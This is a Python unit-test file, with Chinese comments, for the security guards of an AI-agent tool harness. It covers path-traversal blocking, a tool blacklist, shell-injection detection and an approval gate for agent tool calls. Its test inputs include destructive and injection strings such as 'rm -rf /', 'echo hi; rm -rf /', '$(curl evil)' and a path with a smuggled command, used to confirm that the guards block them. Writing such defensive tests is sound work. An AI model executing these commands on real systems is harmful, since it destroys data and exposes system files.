"""治理与安全单元测试（零依赖核心 + langchain 工具包装）。"""
import pytest
from langchain_core.tools import StructuredTool, ToolException

from src.harness.security.guard import (
    FilePathGuardian,
    RuleBasedGuardian,
    ShellEvasionGuardian,
    ToolGuardEngine,
)
from src.harness.security.guarded_tool import PolicyGuardedTool, make_guarded_tools


def test_filepath_guardian_blocks_traversal():
    g = FilePathGuardian(allowed_roots=["/safe"])
    assert g.check("write_file", {"path": "/safe/ok.txt"}).allowed
    assert not g.check("write_file", {"path": "/etc/passwd"}).allowed
    assert not g.check("write_file", {"path": "../secrets"}).allowed


def test_rulebased_guardian_blocks_dangerous_tools():
    g = RuleBasedGuardian()
    assert not g.check("delete_file", {}).allowed
    assert not g.check("exec", {"cmd": "rm -rf /"}).allowed
    assert g.check("calculator", {"a": 1}).allowed


def test_shellevasion_guardian_blocks_injection():
    g = ShellEvasionGuardian()
    assert not g.check("run_command", {"cmd": "echo hi; rm -rf /"}).allowed
    assert not g.check("run_command", {"cmd": "$(curl evil)"}).allowed
    assert g.check("run_command", {"cmd": "ls -la"}).allowed


def test_engine_fail_closed_on_exception():
    class Boom(BaseGuardian := type("B", (), {})):
        name = "boom"

        def check(self, tool_name, args):
            raise RuntimeError("kaboom")

    # 用真实基类
    from src.harness.security.guard import BaseGuardian

    class BoomGuard(BaseGuardian):
        name = "boom"

        def check(self, tool_name, args):
            raise RuntimeError("kaboom")

    eng = ToolGuardEngine(guardians=[BoomGuard()])
    assert not eng.is_allowed("anything", {})


def test_guarded_tool_blocks_on_deny():
    def rm(path: str) -> str:
        return f"deleted {path}"

    tool = StructuredTool.from_function(func=rm, name="delete_file", description="delete")
    eng = ToolGuardEngine()  # delete_file 在 RuleBased 黑名单
    gt = PolicyGuardedTool(tool=tool, engine=eng)
    with pytest.raises(ToolException):
        gt._run(path="/tmp/x")


def test_guarded_tool_allows_safe():
    def add(a: float, b: float) -> str:
        return str(a + b)

    tool = StructuredTool.from_function(func=add, name="calculator", description="add")
    eng = ToolGuardEngine()
    gt = PolicyGuardedTool(tool=tool, engine=eng)
    assert gt._run(a=1, b=2) == "3.0"


def test_make_guarded_tools_keeps_original_names():
    tool = StructuredTool.from_function(
        func=lambda a: a, name="calculator", description="add"
    )
    guarded = make_guarded_tools([tool], ToolGuardEngine())
    assert "calculator" in guarded
    assert guarded["calculator"].name == "calculator"


def test_shellevasion_exempts_write_file_content():
    """写文件的内容是代码/HTML，含 ; && || 不应被判为 shell 注入。

    这是「写俄罗斯方块 HTML 被误杀」的根因回归：ShellEvasion 必须跳过
    write_file/edit_file 的 content/old/new 等数据字段。
    """
    g = ShellEvasionGuardian()
    js = "function f(){ if(x && y){ doThing(); } return a; }"
    assert g.check("write_file", {"path": "game.js", "content": js}).allowed
    assert g.check(
        "edit_file", {"path": "g.js", "old": "a; b", "new": "c && d"}
    ).allowed


def test_shellevasion_still_scans_path_field():
    """路径/控制字段仍要扫描（数据字段豁免不等于完全不扫）。"""
    g = ShellEvasionGuardian()
    assert not g.check("write_file", {"path": "/x; rm -rf /"}).allowed


def test_shellevasion_exec_still_scans_command():
    """exec 类命令串仍扫描 shell 元字符（即便图里通常走独立引擎）。"""
    g = ShellEvasionGuardian()
    assert not g.check("exec", {"command": "echo hi; rm -rf /"}).allowed
    assert g.check("exec", {"command": "ls -la"}).allowed


def _ai_with_tool_calls(calls):
    from langchain_core.messages import AIMessage

    return AIMessage(content="", tool_calls=calls)


def test_approvalgate_autopproves_workspace_file_writes():
    """非信任模式下，workspace 内 write_file/edit_file 自动放行（不再卡死编码）。"""
    from src.harness.security.approval import ApprovalGate

    gate = ApprovalGate(trust_mode=False)  # 默认 AUTO：trust_mode=False
    state = {
        "messages": [
            _ai_with_tool_calls(
                [{"name": "write_file", "args": {"path": "a.html", "content": "<x/>"}, "id": "1"}]
            )
        ]
    }
    assert gate.check(state) is None  # 无需审批

    state2 = {
        "messages": [
            _ai_with_tool_calls(
                [{"name": "edit_file", "args": {"path": "a.js", "old": "x", "new": "y"}, "id": "2"}]
            )
        ]
    }
    assert gate.check(state2) is None


def test_approvalgate_still_requires_dangerous_or_delete():
    """破坏性 exec 与 delete_file 仍走审批（底线保留）。"""
    from src.harness.security.approval import ApprovalGate

    gate = ApprovalGate(trust_mode=False)
    # 危险 exec
    state = {
        "messages": [
            _ai_with_tool_calls(
                [{"name": "exec", "args": {"command": "rm -rf /"}, "id": "1"}]
            )
        ]
    }
    assert gate.check(state) is not None
    # delete_file（非信任模式）
    state2 = {
        "messages": [
            _ai_with_tool_calls(
                [{"name": "delete_file", "args": {"path": "a.txt"}, "id": "2"}]
            )
        ]
    }
    assert gate.check(state2) is not None
